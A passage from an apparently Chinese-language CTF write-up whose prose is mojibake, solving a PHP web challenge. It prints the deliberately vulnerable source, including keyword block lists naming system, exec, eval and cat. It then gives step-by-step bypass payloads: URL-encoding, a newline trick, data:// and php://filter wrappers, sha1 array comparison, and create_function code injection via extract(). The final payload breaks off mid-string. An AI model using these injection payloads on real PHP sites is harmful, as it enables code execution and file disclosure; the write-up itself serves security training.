</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="s2">&#34;1nD3x.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$shana</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;shana&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$passwd</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$arg</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$code</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&#34;|\&#39;|log/i&#39;</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>  
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;You seem to want to do something bad?&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/http|https/i&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^aqua_is_cute$/&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;debu&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;debu&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">&#39;aqua_is_cute&#39;</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">        <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">];</span> 
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Neeeeee! Good Job!&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;fxck you! What do you want to do ?!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span><span class="p">(</span><span class="nv">$_REQUEST</span> <span class="k">as</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-zA-Z]/i&#39;</span><span class="p">,</span> <span class="nv">$value</span><span class="p">))</span>  
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;fxck you! I hate English!&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">!==</span> <span class="s1">&#39;debu_debu_aqua&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$shana</span><span class="p">)</span> <span class="o">===</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$passwd</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$shana</span> <span class="o">!=</span> <span class="nv">$passwd</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;flag&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Very good! you know my password. But what is flag?&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[a-z0-9]*$/isD&#39;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">)</span> <span class="o">||</span> 
</span></span><span class="line"><span class="cl"><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\&#34;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#39;</span><span class="p">,</span> <span class="nv">$arg</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag =w=&#34;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="k">include</span> <span class="s2">&#34;flag.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$code</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$arg</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Á¨¨‰∏ÄÂ±Ç</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&#34;|\&#39;|log/i&#39;</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>  
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ëøô‰∏ÄÂ±ÇÁî®urlÁºñÁ†ÅÁªïËøá</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?%73hana=1
</span></span></code></pre></td></tr></table>
</div>
</div><p>Á¨¨‰∫åÂ±Ç</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/http|https/i&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^aqua_is_cute$/&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;debu&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;debu&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">&#39;aqua_is_cute&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Âú®‰º†ÂÖ•ÂèÇÊï∞ÊúÄÂêéÂä†ÂÖ•Êç¢Ë°åÁ¨¶Â∞±ËÉΩÁªïËøá%0a</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?%64ebu=%61qua_is_%63ute%0a
</span></span></code></pre></td></tr></table>
</div>
</div><p>Á¨¨‰∏âÂ±Ç</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span><span class="p">(</span><span class="nv">$_REQUEST</span> <span class="k">as</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-zA-Z]/i&#39;</span><span class="p">,</span> <span class="nv">$value</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>$_REQUESTÂú®ÂêåÊó∂Êé•Êî∂GETÂíåPOSTÂèÇÊï∞Êó∂ÔºåPOST‰ºòÂÖàÁ∫ßÊõ¥È´ò</p>
<p>ÊâÄ‰ª•Âè™ÈúÄË¶ÅPOSTÁõ∏ÂêåÁöÑÂèÇÊï∞Âç≥ÂèØÁªïËøá„ÄÇ</p>
<p>Á¨¨ÂõõÂ±Ç</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">!==</span> <span class="s1">&#39;debu_debu_aqua&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Áî®data‰º™ÂçèËÆÆÊàñËÄÖphp://inputÂÜôÂÖ•</p>
<p>Á¨¨‰∫îÂ±Ç</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$shana</span><span class="p">)</span> <span class="o">===</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$passwd</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$shana</span> <span class="o">!=</span> <span class="nv">$passwd</span> <span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Êï∞ÁªÑÁªïËøá</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?shana[]=1&amp;passwd[]=2
</span></span></code></pre></td></tr></table>
</div>
</div><p>Á¨¨ÂÖ≠Â±Ç</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[a-z0-9]*$/isD&#39;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">)</span> <span class="o">||</span> 
</span></span><span class="line"><span class="cl"><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\&#34;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#39;</span><span class="p">,</span> <span class="nv">$arg</span><span class="p">)</span> <span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>$code</code>Âíå<code>$arg</code>ÂèØÊéßÔºåÂà©Áî®<code>$code('',$arg)</code>ËøõË°å<code>create_functionÊ≥®ÂÖ•</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">Âú®‰∏ä‰∏ÄÈò∂ÊÆµÁöÑ</span><span class="n">extract</span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s2">&#34;flag&#34;</span><span class="p">]);</span><span class="err">Â§ÑËøõË°åÂèòÈáèË¶ÜÁõñÔºå‰ªéËÄå‰ΩøÂèòÈáè</span><span class="o">$</span><span class="n">codeÂíåÂèòÈáè</span><span class="o">$</span><span class="n">argÂèØÊéß</span>
</span></span><span class="line"><span class="cl"><span class="err">È¶ñÂÖàÈó≠ÂêàÂéüÊúâÁöÑËØ≠Âè•Ôºö</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="p">[</span><span class="n">arg</span><span class="p">]</span><span class="o">=</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="err">ÂæàÂ§öÂáΩÊï∞Ë¢´Á¶ÅÁî®ÔºåÂÖà‰ΩøÁî®</span><span class="n">get_defined_vars</span><span class="p">()</span><span class="err">Â∞ÜÊâÄÊúâÂèòÈáè‰∏éÂÄºÈÉΩËøõË°åËæìÂá∫</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="p">[</span><span class="n">code</span><span class="p">]</span><span class="o">=</span><span class="n">create_function</span><span class="o">&amp;</span><span class="n">flag</span><span class="p">[</span><span class="n">arg</span><span class="p">]</span><span class="o">=</span><span class="p">}</span><span class="n">var_dump</span><span class="p">(</span><span class="n">get_defined_vars</span><span class="p">());</span><span class="o">//</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span> <span class="err">Á≠â‰ª∑‰∫é</span>
</span></span><span class="line"><span class="cl"><span class="n">function</span><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">var_dump</span><span class="p">(</span><span class="n">get_defined_vars</span><span class="p">());</span><span class="o">//</span><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂæóÂà∞rea1fl4g.php</p>
<p>Âà©Áî®<code>require()</code>ÔºåÊù•‰ª£Êõø<code>include()</code>Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">flag</span><span class="p">[</span><span class="n">code</span><span class="p">]</span><span class="o">=</span><span class="n">create_function</span><span class="o">&amp;</span><span class="n">flag</span><span class="p">[</span><span class="n">arg</span><span class="p">]</span><span class="o">=</span><span class="p">}</span><span class="n">require</span><span class="p">(</span><span class="n">base64_decode</span><span class="p">(</span><span class="n">cmVhMWZsNGcucGhw</span><span class="p">));</span><span class="n">var_dump</span><span class="p">(</span><span class="n">get_defined_vars</span><span class="p">());</span><span class="o">//</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂæóÂà∞ÂÅáflag</p>
<p>urlÂèñÂèçÁªïËøá</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">echo</span> <span class="n">urlencode</span><span class="p">(</span><span class="o">~</span><span class="s1">&#39;php://filter/read=convert.base64-encode/resource=rea1fl4g.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="err">Áî®</span><span class="n">require</span><span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="o">%</span><span class="mi">8</span><span class="n">f</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="mi">8</span><span class="n">f</span><span class="o">%</span><span class="n">c5</span><span class="o">%</span><span class="n">d0</span><span class="o">%</span><span class="n">d0</span><span class="o">%</span><span class="mi">99</span><span class="o">%</span><span class="mi">96</span><span class="o">%</span><span class="mi">93</span><span class="o">%</span><span class="mi">8</span><span class="n">b</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="mi">8</span><span class="n">d</span><span class="o">%</span><span class="n">d0</span><span class="o">%</span><span class="mi">8</span><span class="n">d</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="mi">9</span><span class="n">e</span><span class="o">%</span><span class="mi">9</span><span class="n">b</span><span class="o">%</span><span class="n">c2</span><span class="o">%</span><span class="mi">9</span><span class="n">c</span><span class="o">%</span><span class="mi">90</span><span class="o">%</span><span class="mi">91</span><span class="o">%</span><span class="mi">89</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="mi">8</span><span class="n">d</span><span class="o">%</span><span class="mi">8</span><span class="n">b</span><span class="o">%</span><span class="n">d1</span><span class="o">%</span><span class="mi">9</span><span class="n">d</span><span class="o">%</span><span class="mi">9</span><span class="n">e</span><span class="o">%</span><span class="mi">8</span><span class="n">c</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="n">c9</span><span class="o">%</span><span class="n">cb</span><span class="o">%</span><span class="n">d2</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="mi">91</span><span class="o">%</span><span class="mi">9</span><span class="n">c</span><span class="o">%</span><span class="mi">90</span><span class="o">%</span><span class="mi">9</span><span class="n">b</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="n">d0</span><span class="o">%</span><span class="mi">8</span><span class="n">d</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="mi">8</span><span class="n">c</span><span class="o">%</span><span class="mi">90</span><span class="o">%</span><span class="mi">8</span><span class="n">a</span><span class="o">%</span><span class="mi">8</span><span class="n">d</span><span class="o">%</span><span class="mi">9</span><span class="n">c</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="n">c2</span><span class="o">%</span><span class="mi">8</span><span class="n">d</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="mi">9</span><span class="n">e</span><span class="o">%</span><span class="n">ce</span><span class="o">%</span><span class="mi">99</span><span class="o">%</span><span class="mi">93</span><span class="o">%</span><span class="n">cb</span><span class="o">%</span><span class="mi">98</span><span class="o">%</span><span class="n">d1</span><span class="o">%</span><span class="mi">8</span><span class="n">f</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="mi">8</span><span class="n">f</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="err">ÊõøÊç¢ÂàöÊâçÁöÑ</span><span class="n">var_dump</span><span class="p">(</span><span class="n">get_defined_vars</span><span class="p">())</span><span class="err">Ë¢´ÁºñÁ†ÅÁöÑÈÉ®ÂàÜÂç≥ÂèØ„ÄÇ</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊúÄÁªàpayload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">//</span> <span class="n">GET</span>
</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="n">debu</span><span class="o">=</span><span class="n">aqua_is_cute</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">&amp;</span><span class="n">file</span><span class="o">=</span><span class="n">data</span><span class="p">:</span><span class="o">//</span><span class="n">text</span><span class="o">/</span><span class="n">plain</span><span class="p">,</span><span class="n">debu_debu_aqua</span><span class="o">&amp;</span><span class="n">shana</span><span class="p">[]</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">passwd</span><span class="p">[]</span><span class="o">=</span><span class="mi">2</span><span class="o">&amp;</span><span class="n">flag</span><span class="p">[</span><span class="n">arg</span><span class="p">]</span><span class="o">=</span><span class="p">};</span><span class="n">require</span><span class="p">(</span><span class="n">php</span><span class="p">:</span><span class="o">//</span><span class="n">filter</span><span class="o">/</span><span class="n">read</span><span class="o">=</span><span class="nb">convert</span><span class="o">.</span><span class="n">base64</span><span class="o">-</span><span class="n">encode</span><span class="o">/</span><span class="n">resource</span><span class="o">=</span><span class="n">rea1fl4g</span><span class="o">.</span><span class="n">php</span><span class="p">);</span><span class="n">var_dump</span><span class="p">(</span><span class="n">get_defined_vars</span><span class="p">());</span><span class="o">//&amp;</span><span class="n">flag</span><span class="p">[</span><span class="n">code</span><span class="p">]</span><span class="o">=</span><span class="n">create_function</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="mi">62</span><span class="o">%</span><span class="mi">75</span><span class="o">=%</span><span class="mi">61</span><span class="o">%</span><span class="mi">71</span><span class="o">%</span><span class="mi">75</span><span class="o">%</span><span class="mi">61</span><span class="n">_is_</span><span class="o">%</span><span class="mi">63</span><span class="o">%</span><span class="mi">75</span><span class="o">%</span><span class="mi">74</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">&amp;</span><span class="n">file</span><span class="o">=</span><span class="n">data</span><span class="p">:</span><span class="o">//</span><span class="n">text</span><span class="o">/</span><span class="n">plain</span><span class="p">,</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="mi">62</span><span class="o">%</span><span class="mi">75</span><span class="n">_</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="mi">62</span><span class="o">%</span><span class="mi">75</span><span class="n">_</span><span class="o">%</span><span class="mi">61</span><span class="o">%</span><span class="mi">71</span><span class="o">%</span><span class="mi">75</span><span class="o">%</span><span class="mi">61</span><span class="o">&amp;%</span><span class="mi">73</span><span class="o">%</span><span class="mi">68</span><span class="o">%</span><span class="mi">61</span><span class="o">%</span><span class="mi">6</span><span class="n">e</span><span class="o">%</span><span class="mi">61</span><span class="p">[]</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;%</span><span class="mi">70</span><span class="o">%</span><span class="mi">61</span><span class="o">%</span><span class="mi">73</span><span class="o">%</span><span class="mi">73</span><span class="o">%</span><span class="mi">77</span><span class="o">%</span><span class="mi">64</span><span class="p">[]</span><span class="o">=</span><span class="mi">2</span><span class="o">&amp;%</span><span class="mi">66</span><span class="o">%</span><span class="mi">6</span><span class="n">c</span><span class="o">%</span><span class="mi">61</span><span class="o">%</span><span class="mi">67</span><span class="p">[</span><span class="o">%</span><span class="mi">61</span><span class="o">%</span><span class="mi">72</span><span class="o">%</span><span class="mi">67</span><span class="p">]</span><span class="o">=</span><span class="p">;}</span><span class="n">require</span><span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="o">%</span><span class="mi">8</span><span class="n">f</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="mi">8</span><span class="n">f</span><span class="o">%</span><span class="n">c5</span><span class="o">%</span><span class="n">d0</span><span class="o">%</span><span class="n">d0</span><span class="o">%</span><span class="mi">99</span><span class="o">%</span><span class="mi">96</span><span class="o">%</span><span class="mi">93</span><span class="o">%</span><span class="mi">8</span><span class="n">b</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="mi">8</span><span class="n">d</span><span class="o">%</span><span class="n">d0</span><span class="o">%</span><span class="mi">8</span><span class="n">d</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="mi">9</span><span class="n">e</span><span class="o">%</span><span class="mi">9</span><span class="n">b</span><span class="o">%</span><span class="n">c2</span><span class="o">%</span><span class="mi">9</span><span class="n">c</span><span class="o">%</span><span class="mi">90</span><span class="o">%</span><span class="mi">91</span><span class="o">%</span><span class="mi">89</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="mi">8</span><span class="n">d</span><span class="o">%</span><span class="mi">8</span><span class="n">b</span><span class="o">%</span><span class="n">d1</span><span class="o">%</span><span class="mi">9</span><span class="n">d</span><span class="o">%</span><span class="mi">9</span><span class="n">e</span><span class="o">%</span><span class="mi">8</span><span class="n">c</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="n">c9</span><span class="o">%</span><span class="n">cb</span><span class="o">%</span><span class="n">d2</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="mi">91</span><span class="o">%</span><span class="mi">9</span><span class="n">c</span><span class="o">%</span><span class="mi">90</span><span class="o">%</span><span class="mi">9</span><span class="n">b</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="n">d0</span><span class="o">%</span><span class="mi">8</span><span class="n">d</span><span class="o">%</span><span class="mi">9</span><span 